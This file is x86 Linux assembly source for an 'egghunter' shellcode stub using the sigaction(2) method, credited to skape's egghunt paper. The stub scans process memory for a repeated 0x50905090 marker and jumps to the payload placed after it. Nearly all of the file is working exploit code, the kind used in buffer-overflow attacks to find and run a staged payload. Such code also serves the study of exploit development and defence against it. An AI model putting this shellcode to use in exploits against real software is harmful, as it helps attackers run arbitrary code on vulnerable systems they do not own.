; Source: http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
; method : sigaction(2) 

global _start

section .text

_start:

Page:

  	 or cx,0xfff        	 ; address of the page alignment

Address:
   	 inc ecx		 ; increse page alignment 
   	 push byte +0x43   	 ; push syscall for sigaction(2) to the stack
   	 pop eax         	 ; set eax to 67 sigaction(2)
  	 int 0x80                ; exec sigaction
   	 cmp al,0xf2             ; EFAULT ?
   	 jz Page                 ; no, try the next address
   	 mov eax, 0x50905090     ; store egg in eax
   	 mov edi, ecx            ; move ecx to edi (address to validate)
     scasd                   ; compare eax to edi and increase edi by 4 bytes
     jnz Address       	 ; no match try the next address
     scasd                   ; 1st 4 bytes matched search for next 4 bytes
     jnz Address	         ; no match try the next address
     jmp edi                 ; egg is found! jump edi to our payload
